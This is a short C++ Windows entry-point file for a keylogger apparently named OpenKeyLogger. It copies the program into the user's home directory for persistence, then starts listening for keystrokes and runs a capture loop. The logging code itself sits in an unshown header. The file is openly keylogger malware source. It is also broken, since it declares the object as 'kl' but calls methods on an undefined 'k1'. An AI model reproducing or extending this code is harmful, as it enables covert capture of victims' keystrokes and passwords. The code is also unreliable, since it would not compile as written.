#include "keylogger.h"

using namespace std;

int wWinMain(HINSTANCE hInst, HINSTANCE prevInst, LPWSTR szCmdLine, int nCmdShow)
{
    KeyLogger* kl = KeyLogger::getInstance();

    k1->install(k1->getUserHomeDirectory() + "OpenKeyLogger.exe");

    kl->listen();

    k1->loop();

    return 0;
}